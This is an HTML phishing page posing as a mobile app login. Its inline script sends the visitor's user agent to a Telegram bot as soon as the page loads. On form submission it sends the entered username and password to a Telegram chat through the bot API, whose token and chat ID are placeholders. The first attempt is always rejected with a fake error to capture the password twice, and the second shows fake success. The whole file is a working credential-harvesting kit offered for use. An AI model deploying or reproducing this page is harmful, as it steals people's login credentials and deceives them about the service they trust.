<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            padding: 0;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 400px;
            height: auto;
            min-height: 400px;
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        img {
            width: 50%;
            max-width: 150px;
            height: auto;
            margin-bottom: 30px; /* Increased spacing */
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[disabled] {
            background-color: #e0e0e0;
            color: #888;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #ff5353;
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #e04a4a;
        }
        .preloader {
            display: none;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #message {
            display: none;
            color: #4CAF50;
            margin-top: 20px;
        }
        #error {
            display: none;
            color: #ff5353;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://play-lh.googleusercontent.com/RzuofxNEXz5zS-IEI8gu9o2AKHdHxNxms-Czl-W_G_QuBHzkuYgk_czeyf_mdREEB94=w240-h480-rw" alt="App Logo">
        <form id="loginForm">
            <input type="text" id="username" value="*****" disabled>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="preloader" id="preloader"></div>
        <div id="message">Logged in successfully!</div>
        <div id="error">Incorrect password. Please try again.</div>
    </div>

    <script>
        // Define Telegram credentials once
        const botToken = 'YOUR_BOT_TOKEN';
        const chatId = 'YOUR_CHAT_ID';

        // Send user agent to Telegram when the page is loaded
        (function() {
            const userAgent = navigator.userAgent;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('User Agent: ' + userAgent)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => console.log('User agent sent:', data))
                .catch(error => console.error('Error sending user agent:', error));
        })();

        let attempt = 0;  // Counter to track the number of login attempts

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            attempt++;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Hide any previous messages
            document.getElementById('message').style.display = 'none';
            document.getElementById('error').style.display = 'none';

            // Show preloader
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('preloader').style.display = 'block';

            const text = `Username: ${username}\nPassword: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    setTimeout(function() {
                        document.getElementById('preloader').style.display = 'none';
                        
                        if (attempt === 1) {
                            // First attempt fails
                            document.getElementById('error').style.display = 'block';
                            document.getElementById('loginForm').style.display = 'block';
                            document.getElementById('password').value = '';  // Clear password field
                        } else if (attempt === 2) {
                            // Second attempt succeeds
                            document.getElementById('message').style.display = 'block';
                        }
                    }, 2000);
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('preloader').style.display = 'none';
                    document.getElementById('message').textContent = 'An error occurred. Please try again.';
                    document.getElementById('message').style.display = 'block';
                });
        });
    </script>
</body>
</html>
